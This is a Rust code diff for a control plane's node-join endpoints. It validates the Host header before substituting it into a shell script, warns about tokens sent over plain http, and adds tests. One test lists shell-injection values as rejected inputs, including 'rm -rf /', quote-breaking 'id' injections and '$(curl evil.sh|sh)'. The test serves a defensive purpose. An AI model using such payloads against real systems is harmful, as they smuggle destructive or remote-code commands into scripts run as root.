@@ -54,7 +54,21 @@ const INSTALL_SH: &str = include_str!("../../../../deploy/install-node.sh");
 
 /// `GET /v1/node/join.sh`
 pub async fn join_script(headers: HeaderMap) -> Response {
-    let body = JOIN_SH.replace(SERVER_PLACEHOLDER, &public_url(&headers));
+    let url = match public_url(&headers) {
+        Ok(url) => url,
+        Err(msg) => return plain(StatusCode::BAD_REQUEST, &msg),
+    };
+    let body = JOIN_SH.replace(SERVER_PLACEHOLDER, &url);
+    // The token in this script is single-use and short-lived, but it is still a
+    // credential and this line is fetched over whatever scheme the operator
+    // typed. Say so where they will read it — in the script itself — rather
+    // than refusing, because a loopback or LAN install over plain http is a
+    // legitimate development setup.
+    let body = if url.starts_with("http://") {
+        warn_on_plaintext(body)
+    } else {
+        body
+    };
     script_response(body)
 }
 
@@ -131,6 +145,17 @@ pub async fn join_command(
         },
     };
 
+    // Resolve the address before minting anything, for the same reason as the
+    // relay above: a token that is spent nowhere is worse than a refused
+    // request.
+    let server = match &via {
+        Some(v) => v.relay_url.clone(),
+        None => match public_url(&headers) {
+            Ok(url) => url,
+            Err(msg) => return plain(StatusCode::BAD_REQUEST, &msg),
+        },
+    };
+
     let (token, expires_at) = match state.store.create_enrollment_token().await {
         Ok(v) => v,
         Err(e) => {
@@ -146,10 +171,6 @@ pub async fn join_command(
         .record_intent(req.host.as_deref(), Some(&name))
         .await;
 
-    let (server, via) = match via {
-        Some(v) => (v.relay_url.clone(), Some(v)),
-        None => (public_url(&headers), None),
-    };
     let command = join_line(&server, &token, via.is_some(), req.probe);
     Json(JoinCommandResponse {
         token,
@@ -461,11 +482,23 @@ fn hex(d: impl AsRef<[u8]>) -> String {
 /// truth and survives a reverse proxy, a TLS terminator and a `Host` rewrite.
 /// Otherwise the request's own `Host` is used, which is what makes the command
 /// work with nothing configured.
-fn public_url(headers: &HeaderMap) -> String {
+/// The address this control plane is reachable at, for a script the operator
+/// will pipe into `sudo bash`.
+///
+/// The `Host` header is attacker-influenced — a proxy that forwards a client
+/// value, a poisoned cache, DNS rebinding — and the result is substituted into
+/// a shell script, so it is **validated, not escaped**. The accepted character
+/// set cannot form a quote, a `$`, a backtick or a newline, which makes the
+/// substitution safe whatever quoting the script uses.
+///
+/// An unusable `Host` is refused rather than replaced by a default: a script
+/// that silently points at `127.0.0.1` looks fine and fails on a host the
+/// operator may not be able to inspect.
+fn public_url(headers: &HeaderMap) -> Result<String, String> {
     if let Ok(url) = std::env::var("AGENTGRID_PUBLIC_URL") {
         let url = url.trim().trim_end_matches('/');
         if !url.is_empty() {
-            return url.to_string();
+            return Ok(url.to_string());
         }
     }
     let host = headers
@@ -473,6 +506,16 @@ fn public_url(headers: &HeaderMap) -> String {
         .and_then(|h| h.to_str().ok())
         .filter(|h| !h.is_empty())
         .unwrap_or("127.0.0.1:7800");
+    if !is_plain_host(host) {
+        // Not echoed verbatim: the value is hostile by definition here, and a
+        // control character in an error body is a way to corrupt a log line or
+        // a terminal. Debug-escaped and truncated.
+        let shown: String = host.chars().take(64).collect();
+        return Err(format!(
+            "the Host header {shown:?} is not a plain host[:port]; set \
+             AGENTGRID_PUBLIC_URL to the address nodes should dial"
+        ));
+    }
     let scheme = headers
         .get("x-forwarded-proto")
         .and_then(|h| h.to_str().ok())
@@ -481,7 +524,30 @@ fn public_url(headers: &HeaderMap) -> String {
         .map(|p| p.split(',').next().unwrap_or(p).trim())
         .filter(|p| *p == "http" || *p == "https")
         .unwrap_or("http");
-    format!("{scheme}://{host}")
+    Ok(format!("{scheme}://{host}"))
+}
+
+/// The character set a `Host` header may contain for it to be pasted into a
+/// shell script: letters, digits, dots, dashes, colons and IPv6 brackets.
+fn is_plain_host(host: &str) -> bool {
+    !host.is_empty()
+        && host.len() <= 255
+        && host
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '[' | ']' | ':'))
+}
+
+/// Insert a warning after the shebang of a script that will be fetched over
+/// plain http.
+fn warn_on_plaintext(script: String) -> String {
+    const WARNING: &str =
+        "# WARNING: this control plane answered over plain http. The enrollment\n\
+                           # token below travels in clear text and anyone on the path can use it\n\
+                           # before it expires. Use https, or pass the token out of band.\n";
+    match script.split_once('\n') {
+        Some((first, rest)) => format!("{first}\n{WARNING}{rest}"),
+        None => format!("{WARNING}{script}"),
+    }
 }
 
 fn plain(code: StatusCode, msg: &str) -> Response {
@@ -496,6 +562,11 @@ fn plain(code: StatusCode, msg: &str) -> Response {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// `AGENTGRID_PUBLIC_URL` is process-global, so the tests that read or
+    /// write it must not run beside each other: saving and restoring is not
+    /// enough when another test observes the value in between.
+    static ENV_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
 
     #[test]
     fn shareable_names_are_the_daemon_and_adapters_only() {
@@ -519,25 +590,24 @@ mod tests {
 
     #[test]
     fn public_url_prefers_the_configured_value_then_the_host_header() {
-        // `AGENTGRID_PUBLIC_URL` is process-global; save and restore so this
-        // test cannot leak into the ones running beside it.
+        let _guard = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
         let saved = std::env::var("AGENTGRID_PUBLIC_URL").ok();
         std::env::set_var("AGENTGRID_PUBLIC_URL", "https://cp.example.com/");
         let mut h = HeaderMap::new();
         h.insert(header::HOST, "ignored:7800".parse().unwrap());
-        assert_eq!(public_url(&h), "https://cp.example.com");
+        assert_eq!(public_url(&h).unwrap(), "https://cp.example.com");
 
         std::env::remove_var("AGENTGRID_PUBLIC_URL");
         let mut h = HeaderMap::new();
         h.insert(header::HOST, "10.0.0.5:7800".parse().unwrap());
         h.insert("x-forwarded-proto", "https, http".parse().unwrap());
-        assert_eq!(public_url(&h), "https://10.0.0.5:7800");
+        assert_eq!(public_url(&h).unwrap(), "https://10.0.0.5:7800");
 
         let mut h = HeaderMap::new();
         h.insert(header::HOST, "10.0.0.5:7800".parse().unwrap());
         h.insert("x-forwarded-proto", "javascript".parse().unwrap());
         assert_eq!(
-            public_url(&h),
+            public_url(&h).unwrap(),
             "http://10.0.0.5:7800",
             "an unknown scheme falls back to http instead of being echoed"
         );
@@ -546,6 +616,73 @@ mod tests {
             Some(v) => std::env::set_var("AGENTGRID_PUBLIC_URL", v),
             None => std::env::remove_var("AGENTGRID_PUBLIC_URL"),
         }
+    }
+
+    /// The `Host` value ends up inside a script that is piped into `sudo bash`.
+    /// Anything that could close a quote or start a substitution must be
+    /// refused before the substitution happens, not escaped after it.
+    #[test]
+    fn a_hostile_host_header_is_refused() {
+        let _guard = ENV_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        let saved = std::env::var("AGENTGRID_PUBLIC_URL").ok();
+        std::env::remove_var("AGENTGRID_PUBLIC_URL");
+
+        for hostile in [
+            "evil\"; rm -rf / #",
+            "cp.example.com'; id; echo '",
+            "$(curl evil.sh|sh)",
+            "`id`",
+            "a b",
+        ] {
+            let mut h = HeaderMap::new();
+            h.insert(header::HOST, hostile.parse().unwrap());
+            let err = public_url(&h).expect_err(&format!("{hostile:?} must be refused"));
+            // Echoing the value back is useful ("which header did you send?")
+            // as long as it is escaped: a raw newline or ESC would let the
+            // header forge a log line or rewrite a terminal.
+            assert!(
+                !err.chars().any(char::is_control),
+                "the refusal must not carry a raw control character: {err:?}"
+            );
+        }
+
+        // A value the HTTP layer itself refuses never reaches this function;
+        // it is listed so the test says so rather than leaving it implied.
+        assert!(
+            "cp.example.com\nrm -rf /"
+                .parse::<axum::http::HeaderValue>()
+                .is_err(),
+            "a header value with a newline is rejected before any handler runs"
+        );
+
+        // No header at all is the loopback default, not a refusal.
+        let h = HeaderMap::new();
+        assert_eq!(public_url(&h).unwrap(), "http://127.0.0.1:7800");
+
+        // The shapes a real deployment uses must still pass.
+        for ok in ["cp.example.com", "10.0.0.5:7800", "[::1]:7800", "localhost"] {
+            let mut h = HeaderMap::new();
+            h.insert(header::HOST, ok.parse().unwrap());
+            assert!(public_url(&h).is_ok(), "{ok:?} must be accepted");
+        }
+
+        match saved {
+            Some(v) => std::env::set_var("AGENTGRID_PUBLIC_URL", v),
+            None => std::env::remove_var("AGENTGRID_PUBLIC_URL"),
+        }
+    }
+
+    #[test]
+    fn a_plaintext_url_puts_a_warning_in_the_script() {
+        let script = "#!/usr/bin/env bash\nset -euo pipefail\n".to_string();
+        let warned = warn_on_plaintext(script);
+        let mut lines = warned.lines();
+        assert_eq!(lines.next(), Some("#!/usr/bin/env bash"));
+        assert!(
+            lines.next().unwrap().starts_with("# WARNING:"),
+            "the warning goes directly under the shebang, where a human reading \
+             the script will see it"
+        );
     }
 
     #[test]
